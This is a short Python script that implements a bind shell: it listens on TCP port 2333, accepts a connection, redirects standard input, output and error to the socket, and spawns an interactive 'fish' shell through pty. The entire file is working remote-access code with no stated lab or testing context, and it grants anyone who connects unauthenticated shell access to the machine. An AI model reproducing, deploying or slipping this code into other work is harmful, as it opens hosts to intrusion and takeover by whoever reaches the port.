import os, sys
import pty
import socket as S

s = S.socket(S.AF_INET, S.SOCK_STREAM)
s.bind(('', 2333))
s.listen(3)

print('Waiting for connecting.')
sock, addr = s.accept()
print(f'Got sock: {addr}')

os.dup2(sock.fileno(), sys.stdin.fileno())
os.dup2(sock.fileno(), sys.stdout.fileno())
os.dup2(sock.fileno(), sys.stderr.fileno())

pty.spawn('fish')
print('Over')
s.close()
